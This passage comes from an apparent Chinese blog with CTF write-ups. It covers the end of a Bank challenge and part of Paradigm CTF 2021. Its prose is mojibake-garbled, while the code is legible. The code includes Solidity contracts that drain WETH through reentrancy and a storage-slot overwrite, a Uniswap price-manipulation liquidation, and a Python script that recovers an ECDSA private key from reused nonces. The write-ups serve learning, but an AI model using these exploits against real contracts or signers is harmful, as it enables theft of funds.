deposit(0, address(this), 0) // ç¬¬ä¸‰æ¬¡è°ƒç”¨balanceOfé‡å…¥,len=1,uniqueTokens == 0<br>              closeLastAccount() // (é€šè¿‡æ£€æŸ¥ .length &gt; 0 &amp;&amp; uniqueTokens == 0)<br>        deposit ç»§ç»­æ‰§è¡Œå¹¶å°† uniqueTokens è®¾ç½®ä¸º 1 <br>    withdraw ç»§ç»­æ‰§è¡Œå¹¶å†æ¬¡åˆ é™¤å¸æˆ·ï¼ˆé€šè¿‡ uniqueTokens == 1 æ£€æŸ¥ï¼‰ <br>deposit ç»§ç»­æ‰§è¡Œï¼Œæˆ‘ä»¬ä¸å…³å¿ƒå®ƒçš„ä½œç”¨<br></code></pre></td></tr></table></figure><p>ä»£ç å®ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">reentrancyState = 1;<br>bank.depositToken(0, address(this), 0);  <br><br>function balanceOf(address  who ) public returns (uint256) &#123;<br>uint result = balances[who];<br><br>    if (reentrancyState == 1) &#123;<br>        reentrancyState++;<br>        bank.withdrawToken(0, this, 0);<br>    &#125; else if (reentrancyState == 2) &#123;<br>        reentrancyState++;<br>        bank.depositToken(0, this, 0);<br>    &#125; else if (reentrancyState == 3) &#123;<br>        reentrancyState++;<br>        bank.closeLastAccount();<br>    &#125;<br><br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä»»æ„å†™å…¥"><a href="#ä»»æ„å†™å…¥" class="headerlink" title="ä»»æ„å†™å…¥"></a>ä»»æ„å†™å…¥</h3><p>å†çœ‹ä¸€ä¸‹ <code>setAccountName</code> å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setAccountName(uint accountId, string name) external &#123;<br>    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);<br><br>    accounts[msg.sender][accountId].accountName = name;<br>&#125;<br></code></pre></td></tr></table></figure><p>è”ç³»æ•°æ®ç»“æ„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Account &#123;<br>    string accountName;<br>    uint uniqueTokens;<br>    mapping(address =&gt; uint) balances;<br>&#125;<br><br>mapping(address =&gt; Account[]) accounts;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æƒ³åˆ°è®¡ç®—å‡ºä¸€ä¸ªaccountId</p><p>å¯ä»¥é€šè¿‡ <code>setAccountName</code> æ¥è®¾ç½®WETHçš„ä½™é¢</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.accountName) == slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.balances<span class="hljs-comment">[WETH]</span>)<br><br>slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.accountName) = <br>&#123;<br>base_key = keccak(abi.encodePacked(msg.sender, 0x02)); //mapping(address =&gt; Account<span class="hljs-comment">[]</span>)<br>acc_key = keccak(base_key) + 3 * accountId //Account<span class="hljs-comment">[]</span> ç±»ä¼¼äºåŠ¨æ€æ•°ç»„ ä¸”Accountå ä¸‰ä¸ªslot<br>accountName_key = acc_key + 0x00 //accountNameå¤„äºç¬¬ä¸€ä½<br>&#125;<br><br>slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.balances<span class="hljs-comment">[WETH]</span>) = <br>&#123;<br>    base_key2 = keccak(abi.encodePacked(msg.sender, 0x02));<br>acc_key2 = keccak(base_key2) + 3 * accountId<br>balances<span class="hljs-comment">[WETH]</span>_key = keccak(abi.encodePacked(address(WETH), acc_key2+0x02)) //balanceså¤„äºç¬¬ä¸‰ä½<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”±æ­¤å¯ä»¥å¾—åˆ°ä»¥ä¸‹æ”»å‡»ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract BadToken is ERC20Like &#123;<br>    mapping(address =&gt; uint) balances;<br><br>    uint stage = 0;<br><br>    function transfer(address dst, uint qty) public returns (bool) &#123;<br>        balances[msg.sender] -= qty;<br>        balances[dst] += qty;<br>        return true;<br>    &#125;<br><br>    function transferFrom(address src, address dst, uint qty) public returns (bool) &#123;<br>        balances[src] -= qty;<br>        balances[dst] += qty;<br>        return true;<br>    &#125;<br><br>    function approve(address, uint) public returns (bool) &#123;<br>        return true;<br>    &#125;<br><br>    function balanceOf(address who) public view returns (uint) &#123;<br>        uint result = balances[who];<br><br>        if (reentrancyState == 1) &#123;<br>            reentrancyState++;<br>            bank.withdrawToken(0, this, 0);<br>        &#125; else if (reentrancyState == 2) &#123;<br>            reentrancyState++;<br>            bank.depositToken(0, this, 0);<br>        &#125; else if (reentrancyState == 3) &#123;<br>            reentrancyState++;<br>            bank.closeLastAccount();<br>        &#125;<br><br>        return result;<br>    &#125;<br><br>    Bank private bank;<br>    WETH9 private weth;<br>    uint public reentrancyState;<br><br>    function exploit(bankSetup setup) public &#123;<br>        bank = setup.bank();<br>        weth = setup.weth();<br><br>        reentrancyState = 1;<br>        bank.depositToken(0, address(this), 0);<br><br>        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));<br>        bytes32 myArrayStart = keccak256(myArraySlot);<br><br>        uint account = 0;<br>        uint slotsNeeded;<br>        while (true) &#123;<br>            bytes32 account0Start = bytes32(uint(myArrayStart) + 3*account);<br>            bytes32 account0Balances = bytes32(uint(account0Start) + 2);<br>            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);<br><br>            slotsNeeded = (uint(-1) - uint(myArrayStart));<br>            slotsNeeded++;<br>            slotsNeeded += uint(wethBalance);<br>            if (uint(slotsNeeded) % 3 == 0) &#123;<br>                break;<br>            &#125;<br>            account++;<br>        &#125;<br><br>        uint accountId = uint(slotsNeeded) / 3;<br><br>        bank.setAccountName(accountId, string(abi.encodePacked(bytes31(uint248(uint(-1))))));<br><br>        bank.withdrawToken(account, address(weth), weth.balanceOf(address(bank)));<br>    &#125;<br>&#125;<br><br>contract bankExploit &#123;<br>    constructor(bankSetup setup) public &#123;<br>        new BadToken().exploit(setup);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup | Paradigm CTF 2021 Part one</title>
    <link href="/2022/09/18/ParadigmCTF2021one/"/>
    <url>/2022/09/18/ParadigmCTF2021one/</url>
    
    <content type="html"><![CDATA[<p> <a href="https://ctf.paradigm.xyz/">Paradigm CTF 2021</a></p><p> <a href="https://github.com/paradigmxyz/paradigm-ctf-2021">Paradigm CTF 2021ä»£ç åº“</a> </p><p><a href="https://github.com/Sissice/Paradigm-CTF-2021-wp">å®Œæ•´wpä»£ç ä»“åº“</a></p><h2 id="HELLO"><a href="#HELLO" class="headerlink" title="HELLO"></a>HELLO</h2><p>é€åˆ†é¢˜ï¼Œè°ƒç”¨solveå³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const &#123; expect &#125; = require(&quot;chai&quot;);<br><br>describe(&quot;hello&quot;, function() &#123;<br>    let attacker;<br>    it(&quot;should return the solved&quot;, async function()&#123;<br>        [attacker] = await ethers.getSigners();<br><br>        const Setup = await ethers.getContractFactory(&quot;Setup&quot;,attacker);<br>        const setup = await Setup.deploy();<br><br>        const helloAddr = await setup.hello();<br>        const hello = await ethers.getContractAt(&quot;Hello&quot;, helloAddr, attacker);<br><br>        await hello.solve();<br>        expect(await setup.isSolved()).to.equal(true);<br>    &#125;)<br>    &#125;<br>)<br></code></pre></td></tr></table></figure><h2 id="SECURE"><a href="#SECURE" class="headerlink" title="SECURE"></a>SECURE</h2><p>è¿™å¥æ˜¯å°†setupä¸­çš„WETHè½¬èµ°ï¼Œæ­¤æ—¶balanceä¸º0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">wallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value));<br></code></pre></td></tr></table></figure><p>å¦‚æœ<code>Setup</code>åˆçº¦æœ‰ 50 (W)ETHï¼ŒæŒ‘æˆ˜å°±è§£å†³äº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs solidity">const &#123; expect &#125; = require(&quot;chai&quot;);<br>const &#123; ethers &#125; = require(&#x27;hardhat&#x27;);<br><br>describe(&quot;secure&quot;, function() &#123;<br>        let attacker,deployer;<br>        it(&quot;should return the solved&quot;, async function()&#123;<br>            [attacker,deployer] = await ethers.getSigners();<br><br>            const WETH = await ethers.getContractAt(&quot;WETH9&quot;, &quot;0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2&quot;, attacker);<br><br>            const Setup = await ethers.getContractFactory(&quot;secureSetup&quot;,attacker);<br>            const setup = await Setup.deploy(&#123;<br>                value: ethers.utils.parseEther(&quot;50.0&quot;)<br>            &#125;);<br>            expect(await WETH.balanceOf(setup.address)).to.equal(0);<br><br>            await WETH.deposit(&#123;<br>                value: ethers.utils.parseEther(&quot;50.0&quot;)<br>            &#125;);<br><br>//è½¬è´¦<br>            await WETH.transfer(setup.address,setup.WANT())<br>            expect(await setup.isSolved()).to.equal(true);<br>        &#125;)<br>    &#125;<br>)<br><br></code></pre></td></tr></table></figure><h2 id="BABYCRYPTO"><a href="#BABYCRYPTO" class="headerlink" title="BABYCRYPTO"></a>BABYCRYPTO</h2><p>é€šå…³è¦æ±‚æ˜¯éªŒç­¾æˆåŠŸ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> pub.verifies(test, ecdsa.Signature(r, s)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;better luck next time&quot;</span>)<br>    exit(<span class="hljs-number">1</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ¯ä¸€æ¬¡çš„réƒ½æ˜¯ç›¸åŒçš„</p><p><img src="/2022/09/18/ParadigmCTF2021one/image-20220905221931560.png" alt="image-20220905221931560"></p><p>ç”±æ­¤å¯ä»¥è”æƒ³åˆ°[capture the ether â€”â€” Account Takeover](<a href="https://sissice.github.io/2022/04/02/capture">https://sissice.github.io/2022/04/02/capture</a> the ether wp/)</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸¤ä¸ªç›¸åŒçš„rè®¡ç®—å‡ºç§é’¥ï¼Œå†åˆ©ç”¨ç§é’¥å¯¹æ¶ˆæ¯è¿›è¡Œç­¾åï¼Œæœ€åè§£æå‡ºç­¾åä¸­çš„rå’Œså³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> SystemRandom<br><span class="hljs-keyword">from</span> ecdsa <span class="hljs-keyword">import</span> ecdsa<br><span class="hljs-keyword">import</span> sha3<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Tuple</span><br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> math<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hash_message</span>(<span class="hljs-params">msg: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    hash the message using keccak256, truncate if necessary</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    k = sha3.keccak_256()<br>    k.update(msg.encode(<span class="hljs-string">&quot;utf8&quot;</span>))<br>    d = k.digest()<br>    n = <span class="hljs-built_in">int</span>(binascii.hexlify(d), <span class="hljs-number">16</span>)<br>    olen = ecdsa.generator_secp256k1.order().bit_length() <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><br>    dlen = <span class="hljs-built_in">len</span>(d)<br>    n &gt;&gt;= <span class="hljs-built_in">max</span>(<span class="hljs-number">0</span>, dlen - olen)<br>    <span class="hljs-keyword">return</span> n<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modInverse</span>(<span class="hljs-params">b,m</span>):</span><br>  g = math.gcd(b, m)<br>  <span class="hljs-keyword">if</span> (g != <span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(b, m - <span class="hljs-number">2</span>, m)<br><br><span class="hljs-comment"># Function to compute a/b under modulo m</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modDivide</span>(<span class="hljs-params">a,b,m</span>):</span><br>  a = a % m<br>  inv = modInverse(b,m)<br>  <span class="hljs-keyword">if</span>(inv == -<span class="hljs-number">1</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Division not defined&quot;</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> (inv*a) % m<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    msg1 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;msg1? &quot;</span>)<br>    msg1_hashed = hash_message(msg1)<br>    msg2 = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;msg2? &quot;</span>)<br>    msg2_hashed = hash_message(msg2)<br>    r1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;r1? &quot;</span>), <span class="hljs-number">16</span>)<br>    s1 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;s1? &quot;</span>), <span class="hljs-number">16</span>)<br>    s2 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;s2? &quot;</span>), <span class="hljs-number">16</span>)<br><br>    g = ecdsa.generator_secp256k1<br>    n = g.order()<br><br>    k = modDivide((msg1_hashed - msg2_hashed), (s1 - s2), n)<br><br>    d = modDivide(((s1 * k) - msg1_hashed), r1, n)<br><br>    test = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;test? &quot;</span>), <span class="hljs-number">16</span>)<br><br>    pub = ecdsa.Public_key(g, g * d)<br>    priv = ecdsa.Private_key(pub, d)<br><br>    sig = priv.sign(test, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;solved r=0x<span class="hljs-subst">&#123;sig.r:032x&#125;</span>&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;solved s=0x<span class="hljs-subst">&#123;sig.s:032x&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="BROKER"><a href="#BROKER" class="headerlink" title="BROKER"></a>BROKER</h2><p>å®ŒæˆæŒ‘æˆ˜çš„æ¡ä»¶æ˜¯åˆçº¦brokeræŒæœ‰çš„wethå°‘äº5 ether</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>       return weth.balanceOf(address(broker)) &lt; 5 ether;<br>   &#125;<br></code></pre></td></tr></table></figure><p>è€ŒBroker ä¸­çš„åˆå§‹ä½™é¢ä¸º 25 WETH å’Œ 500,000 Token</p><p>brokerä¸­å¯ä»¥è½¬å‡ºWETHçš„å‡½æ•°æœ‰ä¸¤ä¸ª</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function withdraw(uint256 amount) public &#123;<br>    deposited[msg.sender] -= amount;<br>    require(safeDebt(msg.sender) &gt;= debt[msg.sender], &quot;err: undercollateralized&quot;);<br><br>    weth.transfer(msg.sender, amount);<br>&#125;<br><br>function liquidate(address user, uint256 amount) public returns (uint256) &#123;<br>    require(safeDebt(user) &lt;= debt[user], &quot;err: overcollateralized&quot;);<br>    debt[user] -= amount;<br>    token.transferFrom(msg.sender, address(this), amount);<br>    uint256 collateralValueRepaid = amount / rate();<br>    weth.transfer(msg.sender, collateralValueRepaid);<br>    return collateralValueRepaid;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­withdrawéœ€è¦æ»¡è¶³safeDebt(msg.sender) &gt;= debt[msg.sender]</p><p>liquidateéœ€è¦æ»¡è¶³safeDebt(user) &lt;= debt[user]</p><p>safeDebt ç”± deposited[user] å’Œ rate() å†³å®š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function rate() public view returns (uint256) &#123;<br>    (uint112 _reserve0, uint112 _reserve1,) = pair.getReserves();<br>    uint256 _rate = uint256(_reserve0 / _reserve1);<br>    return _rate;<br>&#125;<br>function safeDebt(address user) public view returns (uint256) &#123;<br>    return deposited[user] * rate() * 2 / 3;<br>&#125;<br></code></pre></td></tr></table></figure><p>brokeræ˜¯ä¸€å®¶è¶…é¢æŠµæŠ¼è´·æ¬¾é“¶è¡Œã€‚ä»¥ WETH ä½œä¸ºæŠµæŠ¼ï¼Œæä¾› Token ä½œä¸ºå€Ÿè´·ã€‚å½“æŠµæŠ¼å“è¢«è®¤ä¸ºæŠµæŠ¼ä¸è¶³æ—¶ï¼Œè¯¥è´¦æˆ·å¯ä»¥è¢«æ¸…ç®—ã€‚æ­£å¦‚æˆ‘ä»¬ä¹‹å‰æåˆ°çš„ï¼ŒæŠµæŠ¼å› å­å°†æ ¹æ® Uniswap äº¤æ˜“å¯¹çš„ä»·æ ¼æ¥å†³å®šã€‚</p><p>æ”»å‡»æ€è·¯ï¼ˆç”Ÿäº§ç¯å¢ƒæ²¡æœ‰è¶³å¤Ÿå¤šçš„ETHï¼Œä¸­å¯ä»¥åœ¨ä¸€ä¸ªé—ªè´·ä¸­å®Œæˆæ”»å‡»ï¼‰ï¼š</p><ol><li><code>Deposit</code> WETH ä½œä¸ºæŠµæŠ¼å“ã€‚</li><li>å°½å¯èƒ½å¤šçš„â€œå€Ÿâ€Tokenï¼Œè®©æ¸…ç®—æ›´å®¹æ˜“ã€‚</li><li>åœ¨ Uniswap äº¤æ˜“å¯¹ä¸­è´­ä¹° Tokenï¼Œæå‡ Token ä»·æ ¼ã€‚</li><li>ç”±äº Token ä»·æ ¼ä¸Šæ¶¨ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„è´¦æˆ·æŠµæŠ¼ä¸è¶³ã€‚</li><li><code>æ¸…ç®—</code>è´¦æˆ·ï¼Œå¿è¿˜é€‚å½“æ•°é‡çš„Tokenä»¥æå–Brokerä¸­çš„WETHã€‚</li></ol><p><a href="https://cloud.tencent.com/developer/article/2010561">Uniswap V2 ä¸­çš„swap</a></p><p><a href="https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol">UniswapV2Router02.sol</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.0;<br><br>import &quot;./Setup.sol&quot;;<br><br>interface Router &#123;<br>    function swapExactTokensForTokens(<br>        uint amountIn,<br>        uint amountOutMin,<br>        address[] calldata path,<br>        address to,<br>        uint deadline<br>    ) external returns (uint[] memory amounts);<br>&#125;<br><br>contract brokerExploit &#123;<br>    uint256 constant DECIMALS = 1 ether;<br>    IUniswapV2Pair pair;<br>    Broker broker;<br>    ERC20Like token;<br>    WETH91 weth;<br>    brokerSetup setup;<br>    Router router = Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);<br><br>    //ç›®æ ‡æ˜¯å°†rateé™ä¸º0ï¼Œç„¶åliquidate<br>    constructor(brokerSetup _setup) payable &#123;<br>        setup = _setup;<br>        weth = setup.weth();<br>        weth.deposit&#123;value: msg.value&#125;();<br>        pair = setup.pair();<br>        broker = setup.broker();<br>        token = ERC20Like(address(setup.token()));<br><br><br>    &#125;<br><br>    function attack() public &#123;<br>        weth.approve(address(broker), type(uint256).max);<br>        weth.approve(address(router), type(uint256).max);<br>        token.approve(address(broker), type(uint256).max);<br>        token.approve(address(router), type(uint256).max);<br><br>        uint256 ethToSend = 15 ether;<br><br>        uint256 balanceBefore = weth.balanceOf(address(this));<br><br><br>        address[] memory path = new address[](2);<br>        path[0] = address(weth);<br>        path[1] = address(token);<br>        uint256[] memory tokensReceived = router.swapExactTokensForTokens(<br>        ethToSend,<br>        1,<br>        path,<br>        address(this),<br>        type(uint256).max<br>        );<br><br><br>        uint256 tokenReceived = tokensReceived[1];<br>        uint256 receivedCollateral = broker.liquidate(address(setup), tokenReceived);<br>        require(weth.balanceOf(address(this)) &gt; balanceBefore);<br>    &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h2 id="FARMER"><a href="#FARMER" class="headerlink" title="FARMER"></a>FARMER</h2><p>è¦æ±‚æ˜¯Daiçš„ä½™é¢å°äºæœŸæœ›å€¼ï¼Œä¸”farmerå’Œfaucetçš„COMPä½™é¢éƒ½ä¸º0.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() public view returns (bool) &#123;<br>    return COMP.balanceOf(address(faucet)) == 0 &amp;&amp;<br>        COMP.balanceOf(address(farmer)) == 0 &amp;&amp;<br>        DAI.balanceOf(address(farmer)) &lt; expectedBalance;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœŸæœ›å€¼expectedBalanceçš„å®šä¹‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">expectedBalance = DAI.balanceOf(address(farmer)) + farmer.peekYield(); 